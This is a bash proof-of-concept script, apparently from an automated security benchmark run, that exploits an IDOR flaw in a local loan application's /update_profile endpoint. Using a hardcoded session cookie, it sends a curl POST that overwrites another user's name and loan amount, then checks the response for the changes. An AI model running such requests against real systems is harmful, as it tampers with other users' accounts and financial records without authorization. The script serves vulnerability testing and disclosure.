#!/bin/bash
# POC: Demonstrates Horizontal Privilege Escalation via IDOR in POST /update_profile endpoint. An authenticated user (user_id=1) can modify another user's (user_id=2) profile by directly specifying the target user_id in the POST request.
# Target: ./repo
# Created: 2025-11-07T16:05:38.735Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# IDOR Horizontal Privilege Escalation POC - /update_profile Endpoint
# This script demonstrates how an authenticated user can modify other users' profiles
# by exploiting insufficient authorization checks on the user_id parameter

TARGET_URL="http://localhost"
ATTACKER_SESSION="eyJ1c2VyX2lkIjoxfQ.aQ4YkA.lgLvgKVY8rtWUW99eOPGiw6Ot28"

echo "=========================================="
echo "IDOR POC: Horizontal Privilege Escalation"
echo "=========================================="
echo ""

# Step 1: Authenticate as user_id=1 and attempt to modify user_id=2's profile
echo "[*] Step 1: Authenticated as user_id=1"
echo "[*] Attempting to modify user_id=2's profile..."
echo ""

PAYLOAD="user_id=2&name=USER2_HACKED&lastname=user2&email=user2@example.com&loan_amount=20000&loan_term_months=120&monthly_payment=424"

echo "[*] Sending POST request to /update_profile"
echo "[*] Payload: $PAYLOAD"
echo ""

RESPONSE=$(curl -s -b "session=$ATTACKER_SESSION" \
  -X POST \
  "${TARGET_URL}/update_profile" \
  -d "$PAYLOAD")

echo "[*] Response from server:"
echo "$RESPONSE"
echo ""

# Step 2: Check if the response contains evidence of successful modification
echo "[*] Step 2: Analyzing response for successful modification..."
echo ""

if echo "$RESPONSE" | grep -q "USER2_HACKED"; then
    echo "[+] SUCCESS: Found 'USER2_HACKED' in response!"
    echo "[+] VULNERABILITY CONFIRMED: User_id=2's name was successfully modified"
    VULN_FOUND=1
else
    echo "[-] 'USER2_HACKED' not found in response"
    VULN_FOUND=0
fi

if echo "$RESPONSE" | grep -q "value=\"20000\""; then
    echo "[+] SUCCESS: Found modified loan_amount '20000' in response!"
    echo "[+] VULNERABILITY CONFIRMED: User_id=2's loan_amount was successfully modified"
    VULN_FOUND=$((VULN_FOUND + 1))
else
    echo "[-] Modified loan_amount not found in response"
fi

echo ""

# Step 3: Verify the IDOR vulnerability
if [ $VULN_FOUND -gt 0 ]; then
    echo "=========================================="
    echo "[+] IDOR VULNERABILITY CONFIRMED!"
    echo "=========================================="
    echo ""
    echo "Summary:"
    echo "- Authenticated user (user_id=1) was able to modify user_id=2's profile"
    echo "- The endpoint lacks proper authorization checks"
    echo "- User-supplied user_id parameter is not validated against session"
    echo ""
    exit 0
else
    echo "=========================================="
    echo "[-] Could not confirm IDOR vulnerability"
    echo "=========================================="
    echo "[!] The endpoint may require additional setup or the vulnerability may not be present"
    echo ""
    exit 1
fi